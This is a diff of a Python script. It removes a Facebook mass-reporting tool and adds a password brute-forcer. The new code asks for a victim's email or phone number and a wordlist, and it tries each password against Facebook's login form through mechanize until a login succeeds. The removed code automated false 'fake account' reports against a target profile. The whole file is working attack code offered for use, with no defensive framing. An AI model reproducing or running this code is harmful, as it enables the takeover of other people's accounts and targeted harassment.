@@ -1,81 +1,55 @@
-#-*-coding:utf-8-*-
-# Fb Mass Reports Account
-# Created By Deray
- 
-import bs4
-import json
-import threading
-import cookielib
+import sys
+import random
 import mechanize
+import cookielib
  
-class reports(threading.Thread):
-    def __init__(self,email,pw,target):
-        threading.Thread.__init__(self)
-        self.email = email
-        self.pw = pw
-        self.tg = target
-    def run(self):
-        br = mechanize.Browser()
-        url="https://mbasic.facebook.com"
-        br.set_handle_equiv(True)
-        br.set_handle_referer(True)
-        br.set_handle_robots(False)
-        br.set_cookiejar(cookielib.LWPCookieJar())
-        br.addheaders = [
-            (
-            "User-Agent","Mozilla/5.0 (Linux; U; Android 5.1)"
-            )
-        ]
-        br.open("https://mbasic.facebook.com")
+print(("""
+Welcome Casp!
+""").encode('utf-8'))
+ 
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+ 
+email = str(raw_input("Email/Number Of Victem : \t"))
+pwd_file = str(raw_input("Wordlist : \t"))
+ 
+try:
+    list = open(pwd_file,'r')
+    passwords = list.readlines()
+except IOError:
+    print('Wrong Wordlist: ')
+    sys.exit(0)
+ 
+def start(password):
+    try:
+        br.addheaders = [('User-agent', random.choice(useragents))]
+        br.open('https://www.facebook.com/login.php?login_attempt=1')
         br.select_form(nr=0)
-        br.form["email"] = "{}".format(
-            self.email
-        )
-        br.form["pass"]  = "{}".format(
-            self.pw
-        )
+ 
+        br.form['email'] = email
+        br.form['pass'] = password
         br.submit()
-        br.open(
-        "https://mbasic.facebook.com/{}".format(
-            self.tg
-            )
-        )
-        bb = bs4.BeautifulSoup(
-        br.response().read(),
-            features = "html.parser"
-        )
-        for x in bb.find_all("a",href=True):
-            if "rapid_report" in x["href"]:
-                kntl=x["href"]
-        br.open(kntl)
-        br._factory.is_html=True
-        j = json.dumps(
-            {
-            "fake":"profile_fake_account",
-            "action_key":"FRX_PROFILE_REPORT_CONFIRMATION",
-            "checked":"yes"
-            }
-        )
-        js = json.loads(j)
-        br.select_form(nr=0)
-        br.form["tag"] =[js["fake"]]
-        br.submit()
-        br._factory.is_html=True
-        br.select_form(nr=0)
-        try:
-            br.form["action_key"] = [js["action_key"]]
-        except:
-            return False
-        br.submit()
-        br._factory.is_html = True
-        try:
-            br.select_form(nr=0)
-            br.form["checked"] = [js["checked"]]
-            br.submit()
-            res=br.response().read()
-            if "Terima kasih atas masukan Anda." in res:
-                print "[*] Reported."
-            else:
-                print "[-] Unreported."
-        except:
-            print "\r[-] Already Reports."
+        log = br.geturl()
+        print("No:\t" + str(password))
+        if log == 'https://www.facebook.com/':
+            print ("\Yes :\t " + password)
+            sys.exit(0)
+        else:
+            return
+    except KeyboardInterrupt:
+        sys.exit(1)
+ 
+br = mechanize.Browser()
+cj = cookielib.LWPCookieJar()
+br.set_handle_robots(False)
+br.set_handle_equiv(True)
+br.set_handle_referer(True)
+br.set_handle_redirect(True)
+br.set_cookiejar(cj)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+ 
+for i in range(len(passwords)):
+    passwords[i] = passwords[i].strip()
+    passwords[i] = passwords[i].replace('\n','')
+ 
+for password in passwords:
+    start(password)
